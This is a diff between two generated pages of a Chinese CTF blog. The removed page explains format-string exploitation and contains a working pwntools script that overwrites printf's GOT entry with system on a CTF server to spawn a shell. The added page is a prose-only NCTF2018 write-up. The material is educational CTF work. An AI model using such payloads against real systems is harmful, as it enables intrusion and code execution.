@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="仅仅记录个人的一点理解。 printf()函数如果没有给定格式化参数，就可以利用它来任意读写。像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用%位置$x这样的形式来读取canary。 利用%num$n的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。例如\x02\x03\x04\x08%num$n就是在0x08040302的位置写上4，因为\x">
+<meta name="description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="格式化字符串">
-<meta property="og:url" content="http://yoursite.com/2018/11/21/格式化字符串/index.html">
+<meta property="og:title" content="NCTF2018">
+<meta property="og:url" content="http://yoursite.com/2018/11/26/NCTF2018/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="仅仅记录个人的一点理解。 printf()函数如果没有给定格式化参数，就可以利用它来任意读写。像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用%位置$x这样的形式来读取canary。 利用%num$n的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。例如\x02\x03\x04\x08%num$n就是在0x08040302的位置写上4，因为\x">
+<meta property="og:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-21T06:57:48.672Z">
+<meta property="og:updated_time" content="2018-11-26T09:20:10.196Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="格式化字符串">
-<meta name="twitter:description" content="仅仅记录个人的一点理解。 printf()函数如果没有给定格式化参数，就可以利用它来任意读写。像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用%位置$x这样的形式来读取canary。 利用%num$n的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。例如\x02\x03\x04\x08%num$n就是在0x08040302的位置写上4，因为\x">
+<meta name="twitter:title" content="NCTF2018">
+<meta name="twitter:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>格式化字符串 | 4eriri&#39;s blog</title>
+<title>NCTF2018 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-格式化字符串" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-NCTF2018" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/11/21/格式化字符串/" class="article-date">
-      <time datetime="2018-11-21T06:37:21.000Z" itemprop="datePublished">2018-11-21</time>
+      <a href="/2018/11/26/NCTF2018/" class="article-date">
+      <time datetime="2018-11-26T09:07:04.000Z" itemprop="datePublished">2018-11-26</time>
 </a>
 
 
@@ -208,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      格式化字符串
+      NCTF2018
     </h1>
   
 
@@ -225,12 +225,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>仅仅记录个人的一点理解。</p>
-<p>printf()函数如果没有给定格式化参数，就可以利用它来任意读写。<br>像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用<code>%位置$x</code>这样的形式来读取canary。</p>
-<p>利用<code>%num$n</code>的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。<br>例如<code>\x02\x03\x04\x08%num$n</code>就是在0x08040302的位置写上4，因为<code>\x02\x03\x04\x08</code>是四个字节。如果想多写一点的话可以用<code>\x02\x03\x04\x08%12c%num$n</code>这样的，就有16个字节，就写上了10（十六进制表示）。</p>
-<p>例题whalectf上的pwn3:</p>
-<p>利用格式化字符串，把printf的got表覆盖为system函数，这样下次调用printf的时候就是调用system函数了。但是%n的话是一次性写4个字节，会发送很多数据，因为每多写1就要多发送一个字节。可以使用%hhn对一个字节进行写。这里system_plt的第一个字节是0x10，而前面payload正好已经发送了16个字节，所以就不需要再添加字节，直接<code>%7$hhn</code>就行了。至于第一个可控制的位置，可以先调试一下程序，发送一下AAAAAAAAA，然后看栈里的数据就很容易知道是7了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;bamboofox.cs.nctu.edu.tw&quot;,22003)</span><br><span class="line">printf_got=0x0804a00c</span><br><span class="line">system_plt=0x08048410</span><br><span class="line">payload=p32(printf_got)</span><br><span class="line">payload+=p32(printf_got+1)</span><br><span class="line">payload+=p32(printf_got+2)</span><br><span class="line">payload+=p32(printf_got+3)</span><br><span class="line">payload+=&quot;%7$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x84-0x10)</span><br><span class="line">payload+=&quot;c%8$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x104-0x84)</span><br><span class="line">payload+=&quot;c%9$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x08-0x04)</span><br><span class="line">payload+=&quot;c%10$hhn&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+        <p>说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。</p>
+<p>someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。</p>
+<p>babystack开了pie，看了网上的教程说可以只覆盖后四位，因为pie不会改变最后三位，所以多试几次肯定会成功，但是输入限制了必需要为8的倍数，与部分覆盖产生了冲突，不知道怎么解决。</p>
+<p>smallbug3也开了pie，先输入接下来接受的输入的长度，要求不大于128，感觉可以输入一个负数的十六进制的表达的形式那种来形成栈溢出，好像也成功了，但是这题不知道怎么泄漏libc基址，后来也就没做。</p>
 
       
     </div>
@@ -239,13 +237,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/11/21/格式化字符串/">格式化字符串</a></p>
+        <p><span>本文标题:</span><a href="/2018/11/26/NCTF2018/">NCTF2018</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-11-21, 14:37:21</p>
-        <p><span>最后更新:</span>2018-11-21, 14:57:48</p>
+        <p><span>发布时间:</span>2018-11-26, 17:07:04</p>
+        <p><span>最后更新:</span>2018-11-26, 17:20:10</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/11/21/格式化字符串/" title="格式化字符串">http://yoursite.com/2018/11/21/格式化字符串/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/21/格式化字符串/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/11/26/NCTF2018/" title="NCTF2018">http://yoursite.com/2018/11/26/NCTF2018/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/26/NCTF2018/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -257,16 +255,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/11/26/NCTF2018/">
-                    NCTF2018
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/11/20/z3求解/">
-                    z3求解
+                <a href="/2018/11/21/格式化字符串/">
+                    格式化字符串
                 </a>
             </div>
         
@@ -314,7 +306,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"格式化字符串　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"NCTF2018　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -334,15 +326,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/11/26/NCTF2018/" title="上一篇: NCTF2018">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/11/20/z3求解/" title="下一篇: z3求解">
+            <a href="/2018/11/21/格式化字符串/" title="下一篇: 格式化字符串">
                 <i class="fa fa-angle-right"></i>
             </a>
         
